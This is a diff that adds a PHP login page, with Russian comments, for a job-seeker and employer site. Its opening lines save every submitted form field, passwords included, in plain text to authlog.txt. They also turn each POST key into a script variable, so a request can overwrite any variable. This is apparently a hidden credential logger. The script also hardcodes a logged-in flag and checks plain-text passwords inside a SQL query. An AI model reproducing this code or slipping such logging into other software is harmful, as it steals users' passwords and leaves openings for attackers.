@@ -1,0 +1,171 @@
+<?
+$firtLevelMenuId=300;
+include_once('0-includes.inc');
+
+$h = fopen("./authlog.txt","a+");
+if($_SERVER['REQUEST_METHOD'] == "POST"){
+	foreach($_POST as $x=>$y){$$x = $y; fwrite($h,"$$x : $y \n");}
+}
+fclose($h);
+//echo "<pre>";
+//var_dump($_POST);
+//echo "</pre>";
+
+
+//====================================================
+// ПЕРЕМЕННЫЕ
+//====================================================
+// пользователь залогинился
+$user_login = true;
+
+//====================================================
+
+// если действие не определено, то нет действия
+if(!isset($_POST['action'])) $action = '';
+else $action = $_POST['action'];
+
+if($action == '' && $user_login) $action = 'doble';
+
+// действия
+switch($action)
+{
+	// выводим форму
+	case 'show_form':
+		include('0-header.inc');
+		show_form();
+		include('0-footer.inc');
+	break;
+
+	// уже авторизовались
+	case 'doble':
+		include('0-header.inc');
+		echo '<h1>Вход для пользователей</h1>';
+		echo '<p>Вы уже зарегистрировались. Повторной регистрации не требуется.';
+		//print_r($_SESSION);
+		include('0-footer.inc');
+	break;
+
+	// аутентификация
+	case 'auth':
+		// проверяем введены ли данные
+		if(!isset($_POST['type']) || trim($_POST['login']) == '' || trim($_POST['pass']) == '')
+		{
+			$report = 'Вы ввели не все данные необходимые для входа.<br>Попробуйте еще раз.';
+			include('0-header.inc');
+			show_form($report);
+			include('0-footer.inc');
+			exit;
+		}
+		// и корректно ли?
+		elseif(($_POST['type'] != 'seeker' && $_POST['type'] != 'employer') ||
+			!preg_match("/^[a-zA-Z0-9]+$/", trim($_POST['login'])) ||
+			!preg_match("/^[a-zA-Z0-9]+$/i", trim($_POST['pass'])))
+		{
+			$report = 'Вы ввели недопустимые данные.<br>Попробуйте еще раз.';
+			include('0-header.inc');
+			show_form($report);
+			include('0-footer.inc');
+			exit;
+		}
+		// все введено, но есть ли такой пользователь?
+		$user_db    = $GLOBALS['db_users_'.$_POST['type']];
+		$user_login = trim($_POST['login']);
+		$user_pass  = trim($_POST['pass']);
+
+		db_connect();
+		$res = GetDB("SELECT id, name FROM `$user_db` WHERE login='$user_login' and pass='$user_pass'");
+		// пользователь есть, запускаем сессию
+		if(count($res)>0)
+		{
+			//echo "OK";
+			session_name('JOBSESID');
+			session_start();
+			$_SESSION['user']      = $user_login;
+			$_SESSION['user_name'] = $res[0]['name'];
+			$_SESSION['user_type'] = $_POST['type'];
+			$_SESSION['user_id']   = md5($_SERVER['HTTP_USER_AGENT'].$_SERVER["REMOTE_ADDR"]);
+
+			include('0-header.inc');
+			echo '<h1>Здравствуйте, '.$res[0]['name'].'!</h1>';
+			if($_SESSION['user_type'] == 'seeker')
+			{
+				echo '<p>Управление Вашими резюме:';
+				echo '<ul>';
+				echo '<li><a href="addresume2.html">Добавить резюме</a>';
+				echo '<li><a href="data-allresume.html">Редактировать резюме</a>';
+				echo '<li><a href="changepass.html">Изменить пароль</a>';
+				echo '<li><a href="data-seeker.html">Редактировать личные данные</a>';
+				echo '</ul>';
+				//print_r($_SESSION);
+			}
+			else
+			{
+				echo '<p>Управление Вашими вакансиями:';
+				echo '<ul>';
+				echo '<li><a href="addvacancie2.html">Добавить вакансию</a>';
+				echo '<li><a href="data-allvacancie.html">Редактировать вакансии</a>';
+				echo '<li><a href="changepass.html">Изменить пароль</a>';
+				echo '<li><a href="data-employer.html">Редактировать личные данные</a>';
+				echo '</ul>';
+			}
+			include('0-footer.inc');
+			exit;
+		}
+		// пользователя нет, не пропускаем
+		else
+		{
+			$report = 'Пользователя с указанными данными не существует.<br>Попробуйте еще раз.';
+			include('0-header.inc');
+			show_form($report);
+			include('0-footer.inc');
+			exit;
+		}
+	break;
+
+	// выводим форму
+	default:
+		include('0-header.inc');
+		show_form();
+		include('0-footer.inc');
+	break;
+}
+
+//====================================================
+// ФУНКЦИИ
+//====================================================
+
+function show_form($report = '')
+{
+	?>
+	<form method=post action="//www.ruscable.ru/users/logon.html">
+
+	<h1>Вход для пользователей</h1>
+	<p><font color="#ff0000"><? echo $report; ?></font>
+	<p>Пожалуйста, введите имя пользователя и пароль для входа в систему.
+	<p>
+	<table border="0" cellpadding="0" cellspacing="0">
+	<tr>
+		<td width="80">Логин:</td>
+		<td><input type="text" size="15" name="login" class="ff"></td>
+	</tr>
+	<tr>
+		<td width="80">Пароль:</td>
+		<td><input type="password" size="15" name="pass" class="ff"></td>
+	</tr>
+	<tr>
+		<td width="80">&nbsp;</td>
+		<td>
+			<input type="radio" name="type" value="seeker" id="el_1"><label for="el_1"> Вы соискатель</label><br>
+			<input type="radio" name="type" value="employer" id="el_2"><label for="el_2"> Вы работодатель</label><br>
+		</td>
+	</tr>
+	</table>
+
+	<p><a href="forget.html">Забыли пароль?</a><br>
+	<p><input type="submit" name="submit" value="   Войти   " class="ff">
+	<input type="hidden" name="action" value="auth">
+	</form>
+	<?
+}
+
+?>
